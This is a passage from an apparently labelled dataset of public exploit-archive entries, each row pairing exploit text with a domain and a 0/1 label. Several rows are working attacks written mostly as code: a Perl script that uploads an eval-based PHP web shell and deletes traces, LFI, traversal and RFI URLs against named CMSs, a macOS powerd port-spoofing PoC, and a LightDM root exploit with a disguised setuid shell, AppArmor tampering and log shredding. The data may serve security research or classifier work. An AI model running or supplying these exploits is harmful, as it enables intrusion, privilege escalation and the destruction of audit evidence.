'OXpjR0Z1UGp3dlpHbDJQand2WW05a2VUNDhMMmgwYld3K0p6cz0='; eval(base64_decode(base64_decode($shell))); ?> ~; my $shell_name = 'eof.php'; # or any desired  print ""\n\t[~] Starting exploit...\n"";  if($expl_url =~ m#http://#){ 	exploit($expl_url); } else { 	exploit('http://'.$expl_url); }  sub exploit { 	 	#	Defining... 	my $site = pop @_; 	my ($a, $b, $c, @d) = split /\//,$site; 	my $path = join('/',@d); 	my $host = $c; 	if($path) {$path = '/'.$path;} 	my ($length, $packet, $config, $injection); 	 	#	Revealing /data/sess.php... 	print ""\n\t[~] Modifying '/data/sess.php'...""; 	$injection = ""action=usb&mail=-|\\?|-&p=../sess.php%00""; 	$length = length($injection); 	$packet = ""POST $path/index.php HTTP/1.1\r\n""; 	$packet .= ""Host: $host\r\n""; 	$packet .= ""Connection: Close\r\n""; 	$packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; 	$packet .= ""Content-Length: $length\r\n\r\n""; 	$packet .= ""$injection""; 	if( ! send_surprise($host, $packet)){ 		die(""\n\t[-] Unable to connect to http://$host\n\n""); 	} 	sleep(1);  	#	Let's cover up traces... 	$injection = ""action=del_pag&pg=../sess.php%00""; 	$length = length($injection);	 	$packet = ""POST $path/index.php HTTP/1.1\r\n""; 	$packet .= ""Host: $host\r\n""; 	$packet .= ""Connection: Close\r\n""; 	$packet .= ""Cookie: sid= \r\n""; 	$packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; 	$packet .= ""Content-Length: $length\r\n\r\n""; 	$packet .= ""$injection""; 	print ""\n\t[~] Covering up traces (deleting sess.php) ...""; 	if( ! send_surprise($host,$packet)) { 		die(""\n\t[-] Unable to connect to http://$host\n\n""); 	} 	sleep(1);  	#	Bypassing auth, creating shell, copying ""/data/sess.php""... 	print ""\n\t[~] Bypassing auth, creating shell...""; 	$injection = ""action=new_pag&title=$shell_name&text=$shell""; 	$length = length($injection); 	$packet = ""POST $path/index.php HTTP/1.1\r\n""; 	$packet .= ""Host: $host\r\n""; 	$packet .= ""Connection: close\r\n""; 	$packet .= ""Cookie: sid= \r\n""; 	$packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; 	$packet .= ""Content-Length: $length\r\n\r\n""; 	$packet .= $injection; 	if( ! send_surprise($host,$packet)){ 		die(""\n\t[-] Unable to connect to http://$host\n\n""); 	} 	sleep(1); 	 	#	Finally check for shell 	print ""\n\t[~] Checking for shell...""; 	$packet = ""POST $path/data/pages/$shell_name HTTP/1.1\r\n""; 	$packet .= ""Host: $host\r\n""; 	$packet .= ""Connection: Close\r\n\r\n""; 	if( ! (my $dat = send_surprise($host,$packet,1))){ 		die(""\n\t[-] Unable to connect to http://$host (check for shell yourself in $path/data/pages/$shell_name)\n\n""); 	} else { 		if ($dat =~ /200 OK/){ 			print ""\n\t[+] Exploited! (check /data/pages/$shell_name)\n\n""; 		} else { 			print ""\n\t[-] Exploiting failed... (but still check /data/pages/$shell_name =))\n\n""; 		} 	} }  sub send_surprise(){ 		 	my $dat = 1; 	my ($host, $packet, $ret) = @_; 	my $socket=IO::Socket::INET->new( 		Proto=>""tcp"", 		PeerAddr=>$host, 		PeerPort=>""80"" 	); 	if( ! $socket){ 		return 0; 	} else { 		 		print $socket $packet; 		if($ret){ 			my $rcv; 			while($rcv = <$socket>){ 			$dat .= $rcv; 			} 		} 		close ($socket); 		return $dat; 	} }  # milw0rm.com [2008-07-07]",.site.,0
8328,"webEdition 6.0.0.4 - 'WE_LANGUAGE' Local File Inclusion *******   Salvatore ""drosophila"" Fresta   *******  [+] Application: webEdition [+] Version: <= 6.0.0.4 [+] Website: http://www.webedition.de  [+] Bugs: [A] Local File Inclusion  [+] Exploitation: Remote [+] Date: 31 Mar 2009  [+] Discovered by: Salvatore ""drosophila"" Fresta [+] Author: Salvatore ""drosophila"" Fresta [+] Contact: e-mail: drosophilaxxx@gmail.com   *************************************************  [+] Menu  1) Bugs 2) Code 3) Fix   *************************************************  [+] Bugs   - [A] Local File Inclusion  [-] Requisites: register_globals = on  This bug allows a guest to include local files. This tecnique can be used to exec remote commands on the vulnerable system using Apache logs.  ...  include_once($_SERVER[""DOCUMENT_ROOT""].""/webEdition/we/include/we_language/"".$GLOBALS[""WE_LANGUAGE""].""/start.inc.php"");  ...   *************************************************  [+] Code   - [A] Local File Inclusion  http://www.site.com/path/index.php?WE_LANGUAGE=../../../../../../../../etc/passwd%00  # milw0rm.com [2009-03-31]",.webedition.de,1
30865,"DomPHP 0.83 - Local Directory Traversal ------------------------------------------------------------- DomPHP <= v0.83 Local Directory Traversal Vulnerability  -------------------------------------------------------------   = Author : Houssamix                        = Script : DomPHP <= v0.83                      = Download : http://www.domphp.com/download/                = BUG :  Local Directory Traversal Vulnerability    = Exploit :                                http://[target]/photoalbum/index.php?urlancien=&url=[Directory]                   Exemple : 				  http://target.com/photoalbum/index.php?urlancien=&url=../../",.domphp.,1
4971,"Web Wiz Rich Text Editor 4.0 - Multiple Vulnerabilities ########################## WwW.BugReport.ir ########################################### # #      AmnPardaz Security Research Team # # Title: Web Wiz Rich Text Editor(TM) # Vendor: http://www.webwizguide.com/ # Bug: Directory traversal + HTM/HTML file creation on the server # Vulnerable Version: 4.0 # Exploit: Available # Fix Available: No! Fast Solution is available. ###################################################################################   #################### - Description: #################### Web Wiz Rich Text Editor (RTE) is a free WYSIWYG HTML Rich Text Editor that replaces standard textarea's with an advanced Word style HTMLarea.  #################### - Vulnerability: #################### Input passed to the FolderName parameter in ""RTE_file_browser.asp"" is not properly sanitised before being used. This can be exploited to list directories, list txt and list zip files through directory traversal attacks. Also, ""RTE_file_browser.asp"" does not check user's session and an unauthenticated attacker can perform this attack. Moreover, by using ""RTE_popup_save_file.asp"" attacker can make his/her HTML or HTM file on the server, so this can be used in XSS attacks or making fake pages.  -POC: http://[WebWiz RTE]/RTE_file_browser.asp?look=save&sub=\.....\\\.....\\\.....\\\.....\\\.....\\\ http://[WebWiz RTE]/RTE_popup_save_file.asp  #################### - Fast Solution : #################### 1- You can see below lines in ""RTE_file_browser.asp""  	'Stip path tampering for security reasons 	strSubFolderName = Replace(strSubFolderName, ""../"", """", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, ""..\"", """", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, ""./"", """", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, "".\"", """", 1, -1, 1)  Only add this to them: 	strSubFolderName = Replace(strSubFolderName, ""/"", ""\"", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, ""\\"", ""\"", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, "".."", """", 1, -1, 1)	 2- Rename ""RTE_popup_save_file.asp"" till main solution by vendor  #################### - Credit : #################### Original Advisory: http://www.bugreport.ir/?/31 AmnPardaz Security Research & Penetration Testing Group Contact: admin[4t}bugreport{d0t]ir WwW.BugReport.ir WwW.AmnPardaz.com  # milw0rm.com [2008-01-23]",.webwizguide.,1
40958,"Apple macOS 10.12.1 / iOS < 10.2 - powerd Arbitrary Port Replacement /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=976  powerd (running as root) hosts the com.apple.PowerManagement.control mach service.  It checks in with launchd to get a server port and then wraps that in a CFPort:    pmServerMachPort = _SC_CFMachPortCreateWithPort(                           ""PowerManagement"",                           serverPort,                            mig_server_callback,                            &context);  It also asks to receive dead name notifications for other ports on that same server port:    mach_port_request_notification(               mach_task_self(),           // task               notify_port_in,                 // port that will die               MACH_NOTIFY_DEAD_NAME,      // msgid               1,                          // make-send count               CFMachPortGetPort(pmServerMachPort),        // notify port               MACH_MSG_TYPE_MAKE_SEND_ONCE,               // notifyPoly               &oldNotify);                                // previous  mig_server_callback is called off of the mach port run loop source to handle new messages on pmServerMachPort:    static void   mig_server_callback(CFMachPortRef port, void *msg, CFIndex size, void *info)   {       mig_reply_error_t * bufRequest = msg;       mig_reply_error_t * bufReply = CFAllocatorAllocate(           NULL, _powermanagement_subsystem.maxsize, 0);       mach_msg_return_t   mr;       int                 options;        __MACH_PORT_DEBUG(true, ""mig_server_callback"", serverPort);              /* we have a request message */       (void) pm_mig_demux(&bufRequest->Head, &bufReply->Head);  This passes the raw message to pm_mig_demux:    static boolean_t    pm_mig_demux(       mach_msg_header_t * request,       mach_msg_header_t * reply)   {       mach_dead_name_notification_t *deadRequest =                        (mach_dead_name_notification_t *)request;       boolean_t processed = FALSE;        processed = powermanagement_server(request, reply);        if (processed)            return true;              if (MACH_NOTIFY_DEAD_NAME == request->msgh_id)        {           __MACH_PORT_DEBUG(true, ""pm_mig_demux: Dead name port should have 1+ send right(s)"", deadRequest->not_port);            PMConnectionHandleDeadName(deadRequest->not_port);            __MACH_PORT_DEBUG(true, ""pm_mig_demux: Deallocating dead name port"", deadRequest->not_port);           mach_port_deallocate(mach_task_self(), deadRequest->not_port);                      reply->msgh_bits            = 0;           reply->msgh_remote_port     = MACH_PORT_NULL;            return TRUE;       }  This passes the message to the MIG-generated code for the powermanagement subsystem, if that fails (because the msgh_id doesn't match the subsystem for example) then this compares the message's msgh_id field to MACH_NOTIFY_DEAD_NAME.  deadRequest is the message cast to a mach_dead_name_notification_t which is defined like this in mach/notify.h:    typedef struct {       mach_msg_header_t   not_header;       NDR_record_t        NDR;       mach_port_name_t not_port;/* MACH_MSG_TYPE_PORT_NAME */       mach_msg_format_0_trailer_t trailer;   } mach_dead_name_notification_t;  This is a simple message, not a complex one. not_port is just a completely controlled integer which in this case will get passed directly to mach_port_deallocate.  The powerd code expects that only the kernel will send a MACH_NOTIFY_DEAD_NAME message but actually anyone can send this and force the privileged process to drop a reference on a controlled mach port name :)  Multiplexing these two things (notifications and a mach service) onto the same port isn't possible to do safely as the kernel doesn't prevent user->user spoofing of notification messages - usually this wouldn't be a problem as attackers shouldn't have access to the notification port.  You could use this bug to replace a mach port name in powerd (eg the bootstrap port, an IOService port etc) with a one for which the attacker holds the receieve right.  Since there's still no KDK for 10.12.1 you can test this by attaching to powerd in userspace and setting a breakpoint in pm_mig_demux at the mach_port_deallocate call and you'll see the controlled value in rsi.  Tested on MacBookAir5,2 MacOS Sierra 10.12.1 (16B2555)  */  // ianbeer  #if 0 MacOS/iOS arbitrary port replacement in powerd  powerd (running as root) hosts the com.apple.PowerManagement.control mach service.  It checks in with launchd to get a server port and then wraps that in a CFPort:  	pmServerMachPort = _SC_CFMachPortCreateWithPort( 													""PowerManagement"", 													serverPort,  													mig_server_callback,  													&context);  It also asks to receive dead name notifications for other ports on that same server port:  	mach_port_request_notification( 							mach_task_self(),           // task 							notify_port_in,                 // port that will die 							MACH_NOTIFY_DEAD_NAME,      // msgid 							1,                          // make-send count 							CFMachPortGetPort(pmServerMachPort),        // notify port 							MACH_MSG_TYPE_MAKE_SEND_ONCE,               // notifyPoly 							&oldNotify);                                // previous  mig_server_callback is called off of the mach port run loop source to handle new messages on pmServerMachPort:  	static void 	mig_server_callback(CFMachPortRef port, void *msg, CFIndex size, void *info) 	{ 			mig_reply_error_t * bufRequest = msg; 			mig_reply_error_t * bufReply = CFAllocatorAllocate( 					NULL, _powermanagement_subsystem.maxsize, 0); 			mach_msg_return_t   mr; 			int                 options;  			__MACH_PORT_DEBUG(true, ""mig_server_callback"", serverPort); 			 			/* we have a request message */ 			(void) pm_mig_demux(&bufRequest->Head, &bufReply->Head);  This passes the raw message to pm_mig_demux:  	static boolean_t  	pm_mig_demux( 			mach_msg_header_t * request, 			mach_msg_header_t * reply) 	{ 			mach_dead_name_notification_t *deadRequest =  											(mach_dead_name_notification_t *)request; 			boolean_t processed = FALSE;  			processed = powermanagement_server(request, reply);  			if (processed)  					return true; 			 			if (MACH_NOTIFY_DEAD_NAME == request->msgh_id)  			{ 					__MACH_PORT_DEBUG(true, ""pm_mig_demux: Dead name port should have 1+ send right(s)"", deadRequest->not_port);  					PMConnectionHandleDeadName(deadRequest->not_port);  					__MACH_PORT_DEBUG(true, ""pm_mig_demux: Deallocating dead name port"", deadRequest->not_port); 					mach_port_deallocate(mach_task_self(), deadRequest->not_port); 					 					reply->msgh_bits            = 0; 					reply->msgh_remote_port     = MACH_PORT_NULL;  					return TRUE; 			}  This passes the message to the MIG-generated code for the powermanagement subsystem, if that fails (because the msgh_id doesn't match the subsystem for example) then this compares the message's msgh_id field to MACH_NOTIFY_DEAD_NAME.  deadRequest is the message cast to a mach_dead_name_notification_t which is defined like this in mach/notify.h:  	typedef struct { 			mach_msg_header_t   not_header; 			NDR_record_t        NDR; 			mach_port_name_t not_port;/* MACH_MSG_TYPE_PORT_NAME */ 			mach_msg_format_0_trailer_t trailer; 	} mach_dead_name_notification_t;  This is a simple message, not a complex one. not_port is just a completely controlled integer which in this case will get passed directly to mach_port_deallocate.  The powerd code expects that only the kernel will send a MACH_NOTIFY_DEAD_NAME message but actually anyone can send this and force the privileged process to drop a reference on a controlled mach port name :)  Multiplexing these two things (notifications and a mach service) onto the same port isn't possible to do safely as the kernel doesn't prevent user->user spoofing of notification messages - usually this wouldn't be a problem as attackers shouldn't have access to the notification port.  You could use this bug to replace a mach port name in powerd (eg the bootstrap port, an IOService port etc) with a one for which the attacker holds the receieve right.  Since there's still no KDK for 10.12.1 you can test this by attaching to powerd in userspace and setting a breakpoint in pm_mig_demux at the mach_port_deallocate call and you'll see the controlled value in rsi.  Tested on MacBookAir5,2 MacOS Sierra 10.12.1 (16B2555) #endif  #include <stdio.h> #include <stdlib.h> #include <unistd.h>  #include <servers/bootstrap.h> #include <mach/mach.h> #include <mach/ndr.h>  char* service_name = ""com.apple.PowerManagement.control"";  struct notification_msg {     mach_msg_header_t   not_header;     NDR_record_t        NDR;     mach_port_name_t not_port; };  mach_port_t lookup(char* name) {   mach_port_t service_port = MACH_PORT_NULL;   kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);   if(err != KERN_SUCCESS){     printf(""unable to look up %s\n"", name);     return MACH_PORT_NULL;   }      return service_port; }  int main() {   kern_return_t err;    mach_port_t service_port = lookup(service_name);    mach_port_name_t target_port = 0x1234; // the name of the port in the target namespace to destroy    printf(""%d\n"", getpid());   printf(""service port: %x\n"", service_port);  	struct notification_msg not = {0};    not.not_header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);   not.not_header.msgh_size = sizeof(struct notification_msg);   not.not_header.msgh_remote_port = service_port;   not.not_header.msgh_local_port = MACH_PORT_NULL;   not.not_header.msgh_id = 0110; // MACH_NOTIFY_DEAD_NAME  	not.NDR = NDR_record;  	not.not_port = target_port;    // send the fake notification message   err = mach_msg(&not.not_header,                  MACH_SEND_MSG|MACH_MSG_OPTION_NONE,                  (mach_msg_size_t)sizeof(struct notification_msg),                  0,                  MACH_PORT_NULL,                  MACH_MSG_TIMEOUT_NONE,                  MACH_PORT_NULL);    printf(""fake notification message: %s\n"", mach_error_string(err));      return 0; }",Apple,1
1861,Redaxo 3.2 - 'INCLUDE_PATH' Remote File Inclusion Script: Redaxo CMS Vendor: http://www.redaxo.de Discovered: beford <xbefordx gmail com>  Redaxo 3.2 - 3.1 - 3.0  ./redaxo/include/addons/image_resize/pages/index.inc.php?REX[INCLUDE_PATH]=attacker  Redaxo 3.0  ./redaxo3_0_demos_patched/redaxo/include/addons/image_resize/pages/index.inc.php?subpage=relations&REX[INCLUDE_PATH]=attacker ./redaxo3_0_demos_patched/redaxo/include/addons/simple_user/pages/index.inc.php?REX[INCLUDE_PATH]=attacker ./redaxo3_0_demos_patched/redaxo/include/addons/stats/pages/index.inc.php?REX[INCLUDE_PATH]=attacker  Redaxo 2.7.4  ./redaxo/include/addons/import_export/pages/index.inc.php?REX[INCLUDE_PATH]=attacker ./redaxo/include/pages/community.inc.php?subpage=newsletter&REX[INCLUDE_PATH]=attacker  # milw0rm.com [2006-06-02],redaxo,1
41923,"LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation Source: https://blogs.securiteam.com/index.php/archives/3134  Vulnerability Summary The following advisory describes a local privilege escalation via LightDM found in Ubuntu versions 16.10 / 16.04 LTS.  Ubuntu is an open source software platform that runs everywhere from IoT devices, the smartphone, the tablet and the PC to the server and the cloud. LightDM is an X display manager that aims to be lightweight, fast, extensible and multi-desktop. It uses various front-ends to draw login interfaces, also called Greeters.   Credit An independent security researcher, G. Geshev (@munmap), has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program   Vendor Responses The vendor has released a patch to address this issue. For more information: https://www.ubuntu.com/usn/usn-3255-1/   CVE Details CVE-2017-7358 <https://nvd.nist.gov/vuln/detail/CVE-2017-7358>   Vulnerability Details The vulnerability is found in *LightDM*, which is the Ubuntu’s default desktop manager, more specifically in the guest login feature. By default *LightDM* allows you to log into a session as a temporary user. This is implemented in a script called ‘*guest-account*‘.  @ubuntu:~$ ls -l /usr/sbin/guest-account -rwxr-xr-x 1 root root 6516 Sep 29 18:56 /usr/sbin/guest-account  @ubuntu:~$ dpkg -S /usr/sbin/guest-account lightdm: /usr/sbin/guest-account  @ubuntu:~$ dpkg -s lightdm Package: lightdm Status: install ok installed Priority: optional Section: x11 Installed-Size: 672 Maintainer: Robert Ancell <robert.ancell@ubuntu.com> Architecture: amd64 Version: 1.19.5-0ubuntu1 Provides: x-display-manager Depends: debconf (>= 0.5) | debconf-2.0, libc6 (>= 2.14), libgcrypt20 (>= 1.7.0), libglib2.0-0 (>= 2.39.4), libpam0g (>= 0.99.7.1), libxcb1, libxdmcp6 , adduser, bash (>= 4.3), dbus, libglib2.0-bin, libpam-runtime (>= 0.76-14), libpam-modules, plymouth (>= 0.8.8-0ubuntu18) Pre-Depends: dpkg (>= 1.15.7.2) Recommends: xserver-xorg, unity-greeter | lightdm-greeter | lightdm-kde- greeter Suggests: bindfs Conflicts: liblightdm-gobject-0-0, liblightdm-qt-0-0 Conffiles: /etc/apparmor.d/abstractions/lightdm a715707411c3cb670a68a4ad738077bf /etc/apparmor.d/abstractions/lightdm_chromium-browser e1195e34922a67fa219b8b95eaf9c305 /etc/apparmor.d/lightdm-guest-session 3c7812f49f27e733ad9b5d413c4d14cb /etc/dbus-1/system.d/org.freedesktop.DisplayManager.conf b76b6b45d7f7ff533c51d7fc02be32f4 /etc/init.d/lightdm be2b1b20bec52a04c1a877477864e188 /etc/init/lightdm.conf 07304e5b3265b4fb82a2c94beb9b577e /etc/lightdm/users.conf 1de1a7e321b98e5d472aa818893a2a3e /etc/logrotate.d/lightdm b6068c54606c0499db9a39a05df76ce9 /etc/pam.d/lightdm 1abe2be7a999b42517c82511d9e9ba22 /etc/pam.d/lightdm-autologin 28dd060554d1103ff847866658431ecf /etc/pam.d/lightdm-greeter 65ed119ce8f4079f6388b09ad9d8b2f9 Description: Display Manager LightDM is a X display manager that:   * Has a lightweight codebase   * Is standards compliant (PAM, ConsoleKit, etc)   * Has a well defined interface between the server and user interface   * Cross-desktop (greeters can be written in any toolkit) Homepage: https://launchpad.net/lightdm  @ubuntu:~$  The script runs as root when you view the login screen, also known as a greeter, to log in as a guest. Ubuntu’s default greeter is Unity Greeter.   *Vulnerable code*  The vulnerable function is ‘*add_account*‘.  35   temp_home=$(mktemp -td guest-XXXXXX) 36   GUEST_HOME=$(echo ${temp_home} | tr '[:upper:]' '[:lower:]') 37   GUEST_USER=${GUEST_HOME#/tmp/} 38   [ ${GUEST_HOME} != ${temp_home} ] && mv ${temp_home} ${GUEST_HOME}  The guest folder gets created using ‘mktemp’ on line 35. The attacker can use ‘*inotify*‘ to monitor ‘*/tmp*‘ for the creation of this folder.  The folder name will likely contain both upper and lower case letters. Once this folder is created, we grab the folder name and quickly and create the equivalent folder with all letters lower case.  If we manage to race the ‘*mv*‘ command on line 38, we end up with the newly created home for the guest user inside the folder we own.  Once we have the guest home under our control, we rename it and replace it with a *symbolic link* to a folder we want to take over. The code below will then add the new user to the OS. The user’s home folder will already point to the folder we want to take over, for example ‘*/usr/local/sbin*‘.  68    useradd --system --home-dir ${GUEST_HOME} --comment $(gettext ""Guest"") --user-group --shell /bin/bash ${GUEST_USER} || { 69      rm -rf ${GUEST_HOME} 70      exit 1 71    }  The attacker can grab the newly created user’s ID and monitor ‘ */usr/local/sbin*‘ for ownership changes. The ownership will be changed by the following ‘*mount*‘.  78  mount -t tmpfs -o mode=700,uid=${GUEST_USER} none ${GUEST_HOME} || { 79    rm -rf ${GUEST_HOME} 80    exit 1 81  }  We will remove the symbolic link and create a folder with the same name – to let the guest user to log in. While the guest is logging in, his path for finding executable files will include ‘*bin*‘ under his home folder.  That’s why we create a new symbolic link to point his ‘*bin*‘ into a folder we control. This way we can force the user to execute our own code under his user ID. We use this to log out the guest user from his session which is where we can gain root access.  The logout code will first execute the following code:  156  PWENT=$(getent passwd ${GUEST_USER}) || { 157    echo ""Error: invalid user ${GUEST_USER}"" 158    exit 1 159  }  This code will be executed as the owner of the script, i.e. root. Since we have already taken over ‘*/usr/local/sbin*‘ and have planted our own ‘ *getent*‘, we get to execute commands as root at this point.  Note – We can trigger the guest session creation script by entering the following two commands.  XDG_SEAT_PATH=""/org/freedesktop/DisplayManager/Seat0"" /usr/bin/dm-tool lock XDG_SEAT_PATH=""/org/freedesktop/DisplayManager/Seat0"" /usr/bin/dm-tool switch-to-guest   Proof of Concept  The Proof of Concept is contains 9 files and they will take advantage of the race conditions mentioned above.     1. kodek/bin/cat    2. kodek/shell.c    3. kodek/clean.sh    4. kodek/run.sh    5. kodek/stage1.sh    6. kodek/stage1local.sh    7. kodek/stage2.sh    8. kodek/boclocal.c    9. kodek/boc.c  By running the following scripts an attacker can run root commands:  @ubuntu:/var/tmp/kodek$ ./stage1local.sh  @ubuntu:/var/tmp/kodek$ [!] GAME OVER !!! [!] count1: 2337 count2: 7278 [!] w8 1 minute and run /bin/subash  @ubuntu:/var/tmp/kodek$ /bin/subash root@ubuntu:~# id uid=0(root) gid=0(root) groups=0(root) root@ubuntu:~#  If the exploit fails, you can simply run it again.  Once you get your root shell, you can optionally clean any exploit files and logs by executing the below.  root@ubuntu:/var/tmp/kodek# ./clean.sh /usr/bin/shred: /var/log/audit/audit.log: failed to open for writing: No such file or directory Do you want to remove exploit (y/n)? y /usr/bin/shred: /var/tmp/kodek/bin: failed to open for writing: Is a directory  root@ubuntu:/var/tmp/kodek#  boc.c  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <ctype.h> #include <sys/inotify.h> #include <sys/stat.h> #include <pwd.h> #define EVENT_SIZE(sizeof(struct inotify_event)) #define EVENT_BUF_LEN(1024 * (EVENT_SIZE + 16)) int main(void) {   struct stat info;   struct passwd * pw;   struct inotify_event * event;   pw = getpwnam(""root"");   if (pw == NULL) exit(0);   char newpath[20] = ""old."";   int length = 0, i, fd, wd, count1 = 0, count2 = 0;   int a, b;   char buffer[EVENT_BUF_LEN];   fd = inotify_init();   if (fd < 0) exit(0);   wd = inotify_add_watch(fd, ""/tmp/"", IN_CREATE | IN_MOVED_FROM);   if (wd < 0) exit(0);   chdir(""/tmp/"");   while (1) {     length = read(fd, buffer, EVENT_BUF_LEN);     if (length > 0) {       event = (struct inotify_event * ) buffer;       if (event - > len) {         if (strstr(event - > name, ""guest-"") != NULL) {           for (i = 0; event - > name[i] != '\0'; i++) {             event - > name[i] = tolower(event - > name[i]);           }           if (event - > mask & IN_CREATE) mkdir(event - > name, ACCESSPERMS) ;           if (event - > mask & IN_MOVED_FROM) {             rename(event - > name, strncat(newpath, event - > name, 15));             symlink(""/usr/local/sbin/"", event - > name);             while (1) {               count1 = count1 + 1;               pw = getpwnam(event - > name);               if (pw != NULL) break;             }             while (1) {               count2 = count2 + 1;               stat(""/usr/local/sbin/"", & info);               if (info.st_uid == pw - > pw_uid) {                 a = unlink(event - > name);                 b = mkdir(event - > name, ACCESSPERMS);                 if (a == 0 && b == 0) {                   printf(""\n[!] GAME OVER !!!\n[!] count1: %i count2: %i\n"", count1, count2);                 } else {                   printf(""\n[!] a: %i b: %i\n[!] exploit failed !!!\n"", a, b );                 }                 system(""/bin/rm -rf /tmp/old.*"");                 inotify_rm_watch(fd, wd);                 close(fd);                 exit(0);               }             }           }         }       }     }   } }  boclocal.c  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <ctype.h> #include <sys/inotify.h> #include <sys/stat.h> #include <pwd.h> #define EVENT_SIZE(sizeof(struct inotify_event)) #define EVENT_BUF_LEN(1024 * (EVENT_SIZE + 16)) int main(void) {   struct stat info;   struct passwd * pw;   struct inotify_event * event;   pw = getpwnam(""root"");   if (pw == NULL) exit(0);   char newpath[20] = ""old."";   int length = 0, i, fd, wd, count1 = 0, count2 = 0;   int a, b, c;   char buffer[EVENT_BUF_LEN];   fd = inotify_init();   if (fd < 0) exit(0);   wd = inotify_add_watch(fd, ""/tmp/"", IN_CREATE | IN_MOVED_FROM);   if (wd < 0) exit(0);   chdir(""/tmp/"");   while (1) {     length = read(fd, buffer, EVENT_BUF_LEN);     if (length > 0) {       event = (struct inotify_event * ) buffer;       if (event - > len) {         if (strstr(event - > name, ""guest-"") != NULL) {           for (i = 0; event - > name[i] != '\0'; i++) {             event - > name[i] = tolower(event - > name[i]);           }           if (event - > mask & IN_CREATE) mkdir(event - > name, ACCESSPERMS) ;           if (event - > mask & IN_MOVED_FROM) {             rename(event - > name, strncat(newpath, event - > name, 15));             symlink(""/usr/local/sbin/"", event - > name);             while (1) {               count1 = count1 + 1;               pw = getpwnam(event - > name);               if (pw != NULL) break;             }             while (1) {               count2 = count2 + 1;               stat(""/usr/local/sbin/"", & info);               if (info.st_uid == pw - > pw_uid) {                 a = unlink(event - > name);                 b = mkdir(event - > name, ACCESSPERMS);                 c = symlink(""/var/tmp/kodek/bin/"", strncat(event - > name, ""/bin"", 5));                 if (a == 0 && b == 0 && c == 0) {                   printf(""\n[!] GAME OVER !!!\n[!] count1: %i count2: %i\n[!] w8 1 minute and run /bin/subash\n"", count1, count2);                 } else {                   printf(""\n[!] a: %i b: %i c: %i\n[!] exploit failed !!!\n[!] w8 1 minute and run it again\n"", a, b, c);                 }                 system(""/bin/rm -rf /tmp/old.*"");                 inotify_rm_watch(fd, wd);                 close(fd);                 exit(0);               }             }           }         }       }     }   } }  clean.sh  #!/bin/bash if [ ""$(/usr/bin/id -u)"" != ""0"" ]; then    echo ""This script must be run as root"" 1>&2    exit 1 fi /bin/rm -rf /tmp/guest-* /tmp/old.guest-* /usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc /var/log/kern .log /var/log/audit/audit.log /var/log/lightdm/* /bin/echo > /var/log/auth.log /bin/echo > /var/log/syslog /bin/dmesg -c >/dev/null 2>&1 /bin/echo ""Do you want to remove exploit (y/n)?"" read answer if [ ""$answer"" == ""y"" ]; then /usr/bin/shred -fu /var/tmp/kodek/* /var/tmp/kodek/bin/* /bin/rm -rf /var/tmp/kodek else exit fi  run.sh  #!/bin/sh /bin/cat << EOF > /usr/local/sbin/getent #!/bin/bash /bin/cp /var/tmp/shell /bin/subash >/dev/null 2>&1 /bin/chmod 4111 /bin/subash >/dev/null 2>&1 COUNTER=0 while [ \$COUNTER -lt 10 ]; do /bin/umount -lf /usr/local/sbin/ >/dev/null 2>&1 let COUNTER=COUNTER+1 done /bin/sed -i 's/\/usr\/lib\/lightdm\/lightdm-guest-session {/\/usr\/lib\/lightdm\/lightdm-guest-session flags=(complain) {/g' /etc/ apparmor.d/lightdm-guest-session >/dev/null 2>&1 /sbin/apparmor_parser -r /etc/apparmor.d/lightdm-guest-session >/dev/null 2> &1 /usr/bin/getent passwd ""\$2"" EOF /bin/chmod 755 /usr/local/sbin/getent >/dev/null 2>&1  shell.c  #define _GNU_SOURCE #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <grp.h>  int main(void) {     setresuid(0, 0, 0);     setresgid(0, 0, 0);     setgroups(0, NULL);     putenv(""HISTFILE=/dev/null"");     execl(""/bin/bash"", ""[bioset]"", ""-pi"", NULL);     return 0; }  stage1.sh  #!/bin/bash if [ ""${PWD}"" == ""/var/tmp/kodek"" ]; then /usr/bin/killall -9 /var/tmp/boc >/dev/null 2>&1 /usr/bin/killall -9 boc >/dev/null 2>&1 /bin/sleep 3s /usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc >/dev/null 2> &1 /usr/bin/gcc boc.c -Wall -s -o /var/tmp/boc /usr/bin/gcc shell.c -Wall -s -o /var/tmp/shell /bin/cp /var/tmp/kodek/run.sh /var/tmp/run.sh /var/tmp/boc else echo ""[!] run me from /var/tmp/kodek"" exit fi  stage1local.sh  #!/bin/bash if [ ""${PWD}"" == ""/var/tmp/kodek"" ]; then /usr/bin/killall -9 /var/tmp/boc >/dev/null 2>&1 /usr/bin/killall -9 boc >/dev/null 2>&1 /bin/sleep 3s /usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc >/dev/null 2> &1 /usr/bin/gcc boclocal.c -Wall -s -o /var/tmp/boc /usr/bin/gcc shell.c -Wall -s -o /var/tmp/shell /bin/cp /var/tmp/kodek/run.sh /var/tmp/run.sh /var/tmp/boc & /bin/sleep 5s XDG_SEAT_PATH=""/org/freedesktop/DisplayManager/Seat0"" /usr/bin/dm-tool lock XDG_SEAT_PATH=""/org/freedesktop/DisplayManager/Seat0"" /usr/bin/dm-tool switch-to-guest else echo ""[!] run me from /var/tmp/kodek"" exit fi  stage2.sh  #!/bin/sh /usr/bin/systemd-run --user /var/tmp/run.sh  /bin/cat  #!/bin/sh /usr/bin/systemd-run --user /var/tmp/run.sh /bin/sleep 15s /bin/loginctl terminate-session `/bin/loginctl session-status | /usr/bin/ head -1 | /usr/bin/awk '{ print $1 }'`",robert_ancell,1
